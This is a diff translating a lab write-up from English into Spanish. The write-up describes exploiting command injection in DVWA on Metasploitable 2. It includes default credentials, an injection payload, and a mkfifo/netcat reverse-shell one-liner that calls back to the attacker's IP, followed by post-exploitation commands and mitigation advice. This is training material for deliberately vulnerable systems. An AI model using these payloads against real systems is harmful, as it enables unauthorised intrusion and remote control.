@@ -1,177 +1,248 @@
-# ✅ HTTP Service Exploitation – Metasploitable 2
+# ✅ Explotación del Servicio HTTP – Metasploitable 2
 
-## 📌 1. Overview
+## 📌 1. Visión General
 
-This project focuses on identifying and exploiting vulnerabilities in the **HTTP service (TCP/80)** running on **Metasploitable 2**. The goal is to demonstrate a full attack chain:
+Este proyecto se centra en la identificación y explotación de vulnerabilidades en el **servicio HTTP (TCP/80)** que se ejecuta en **Metasploitable 2**. El objetivo es demostrar una **cadena de ataque completa**:
 
-✅ Enumeration  
-✅ Vulnerability discovery  
-✅ Remote Code Execution (RCE)  
+✅ Enumeración  
+✅ Descubrimiento de vulnerabilidades  
+✅ Ejecución Remota de Código (RCE)  
 ✅ Reverse Shell  
-✅ System compromise  
+✅ Compromiso del sistema  
 
 ---
 
-## 📌 2. Target & Attacker Information
+## 📌 2. Información del Objetivo y del Atacante
 
-| Component | Details |
-|----------|---------|
-| Attacker Machine | Kali Linux |
-| Attacker IP | 192.168.56.102 |
-| Target Machine | Metasploitable 2 |
-| Target IP | 192.168.56.101 |
-| Service | HTTP (Apache 2.2.8) |
-| Application | DVWA (Damn Vulnerable Web App) |
+| Componente | Detalles |
+|-----------|----------|
+| Máquina atacante | Kali Linux |
+| IP del atacante | 192.168.56.102 |
+| Máquina objetivo | Metasploitable 2 |
+| IP del objetivo | 192.168.56.101 |
+| Servicio | HTTP (Apache 2.2.8) |
+| Aplicación | DVWA (Damn Vulnerable Web App) |
 
 ---
 
-## 📌 3. Initial Enumeration
+## 📌 3. Enumeración Inicial
 
-A service/version scan was performed using Nmap:
+Se realizó un escaneo de servicios y versiones utilizando **Nmap**:
 
 ```bash
 nmap -sV -O -p80 192.168.56.101
+```
 
-✅ Result
+✅ **Resultado**
 
+```text
 80/tcp open http Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+```
 
-➡️ The target is running an outdated Apache server hosting DVWA, a vulnerable web app.
-📌 4. Access to DVWA
+➡️ El objetivo ejecuta un servidor **Apache obsoleto** que aloja **DVWA**, una aplicación web vulnerable.
 
-DVWA was reachable via HTTP and allowed login using default credentials:
+---
 
-Username: admin
-Password: password
+## 📌 4. Acceso a DVWA
 
-✅ Indicates poor authentication policy
-✅ Enables attacker access without brute force
-📌 5. Vulnerability Identification – Command Injection
+DVWA era accesible vía HTTP y permitía el inicio de sesión utilizando credenciales por defecto:
 
-Inside DVWA:
+```text
+Usuario: admin
+Contraseña: password
+```
 
+✅ Indica una política de autenticación deficiente
+✅ Permite el acceso del atacante sin necesidad de fuerza bruta
+
+---
+
+## 📌 5. Identificación de la Vulnerabilidad – Inyección de Comandos
+
+Dentro de DVWA:
+
+```text
 Vulnerabilities → Command Injection
+```
 
-A test payload was executed:
+Se ejecutó el siguiente payload de prueba:
 
+```text
 127.0.0.1; id
+```
 
-✅ Response
+✅ **Respuesta**
 
+```text
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
 
-✅ Confirmed Remote Command Execution (RCE)
-✅ Commands executed on the server as www-data
-📌 6. Exploitation – Reverse Shell
-🔹 Step 1: Start listener on Kali
+✅ Ejecución remota de comandos confirmada (RCE)
+✅ Los comandos se ejecutan en el servidor como **www-data**
 
+---
+
+## 📌 6. Explotación – Reverse Shell
+
+### 🔹 Paso 1: Iniciar listener en Kali
+
+```bash
 nc -lvnp 4444
+```
 
-Expected output:
+**Salida esperada:**
 
+```text
 listening on [any] 4444 ...
+```
 
-🔹 Step 2: Execute payload in DVWA
+### 🔹 Paso 2: Ejecutar el payload en DVWA
 
+```text
 127.0.0.1; mkfifo /tmp/f; nc 192.168.56.102 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1
+```
 
-✅ This creates a FIFO pipe and spawns a reverse shell to the attacker.
-📌 7. Successful Shell Capture
+✅ Esto crea una tubería FIFO y establece una **reverse shell** hacia el atacante.
 
-On the Kali listener:
+---
 
+## 📌 7. Captura Exitosa de la Shell
+
+En el listener de Kali:
+
+```text
 connect to [192.168.56.102] from (UNKNOWN) [192.168.56.101] 51058
+```
 
-We now have remote shell access.
-📌 8. Post-Exploitation Validation
-🔹 Check current user
+Se obtiene acceso remoto al sistema.
 
+---
+
+## 📌 8. Validación Post-Explotación
+
+### 🔹 Usuario actual
+
+```bash
 whoami
+```
 
+```text
 www-data
+```
 
-🔹 System information
+### 🔹 Información del sistema
 
+```bash
 uname -a
+```
 
+```text
 Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+```
 
-🔹 Current directory
+### 🔹 Directorio actual
 
+```bash
 pwd
+```
 
+```text
 /var/www/dvwa/vulnerabilities/exec
+```
 
-🔹 Directory listing
+### 🔹 Listado de directorios
 
+```bash
 ls -la
+```
 
+```text
 total 20
 drwxr-xr-x  4 www-data www-data 4096 May 20  2012 .
 drwxr-xr-x 11 www-data www-data 4096 May 20  2012 ..
 drwxr-xr-x  2 www-data www-data 4096 May 20  2012 help
 -rw-r--r--  1 www-data www-data 1509 Mar 16  2010 index.php
 drwxr-xr-x  2 www-data www-data 4096 May 20  2012 source
+```
 
-🔹 User identity details
+### 🔹 Identidad del usuario
 
+```bash
 id
+```
 
+```text
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
 
-🔹 Hostname
+### 🔹 Hostname
 
+```bash
 hostname
+```
 
+```text
 metasploitable
+```
 
-✅ Full remote access confirmed
-✅ Code execution on the host
-✅ Control of the target filesystem
-📌 9. Impact Analysis
-Category	Result
-Vulnerability Type	Remote Code Execution
-Access Level	www-data
-Authentication Required	No
-Impact	Critical
-Risk	Full system compromise possible
+✅ Acceso remoto completo confirmado
+✅ Ejecución de código en el host
+✅ Control del sistema de archivos del objetivo
 
-An attacker could:
+---
 
-    Steal data
+## 📌 9. Análisis de Impacto
 
-    Modify files
+| Categoría               | Resultado                            |
+| ----------------------- | ------------------------------------ |
+| Tipo de vulnerabilidad  | Ejecución Remota de Código           |
+| Nivel de acceso         | www-data                             |
+| Autenticación requerida | No                                   |
+| Impacto                 | Crítico                              |
+| Riesgo                  | Posible compromiso total del sistema |
 
-    Upload backdoors
+Un atacante podría:
 
-    Escalate privileges
+* Robar datos
+* Modificar archivos
+* Subir backdoors
+* Escalar privilegios
+* Moverse lateralmente
 
-    Move laterally
+---
 
-📌 10. Root Cause
+## 📌 10. Causa Raíz
 
-    Lack of input sanitization
+* Falta de sanitización de entradas
+* Aplicación web vulnerable expuesta
+* Credenciales por defecto habilitadas
+* Aislamiento de privilegios débil
 
-    Vulnerable web application exposed
+---
 
-    Default credentials enabled
+## 📌 11. Recomendaciones de Mitigación
 
-    Weak privilege isolation
+✅ Sanitizar y validar todas las entradas del usuario
+✅ Eliminar DVWA de entornos productivos
+✅ Deshabilitar credenciales por defecto
+✅ Endurecer la configuración de Apache y PHP
+✅ Aplicar el principio de mínimo privilegio
+✅ Implementar monitorización y logging
 
-📌 11. Mitigation Recommendations
+---
 
-✅ Sanitize and validate all user inputs
-✅ Remove DVWA from production environments
-✅ Disable default credentials
-✅ Harden Apache and PHP configurations
-✅ Apply least-privilege policies
-✅ Implement monitoring and logging
-✅ 12. Executive Summary
+## 📌 12. Resumen Ejecutivo
 
-A critical RCE vulnerability was discovered in the HTTP service via DVWA's Command Injection module. The attacker successfully obtained a reverse shell on the target machine and executed system-level commands remotely, confirming full system compromise through the web interface.
-✅ 13. Status
-Stage	Result
-Enumeration	✅ Complete
-Vulnerability Discovery	✅ RCE identified
-Exploitation	✅ Reverse shell obtained
-Post-Exploitation	✅ System access confirmed
+Se descubrió una vulnerabilidad crítica de **Ejecución Remota de Código (RCE)** en el servicio HTTP a través del módulo de **Inyección de Comandos** de DVWA. El atacante obtuvo con éxito una **reverse shell** en la máquina objetivo y ejecutó comandos a nivel de sistema de forma remota, confirmando el compromiso total del sistema a través de la interfaz web.
+
+---
+
+## 📌 13. Estado
+
+| Fase                               | Resultado                      |
+| ---------------------------------- | ------------------------------ |
+| Enumeración                        | ✅ Completa                     |
+| Descubrimiento de vulnerabilidades | ✅ RCE identificada             |
+| Explotación                        | ✅ Reverse shell obtenida       |
+| Post-explotación                   | ✅ Acceso al sistema confirmado |
+
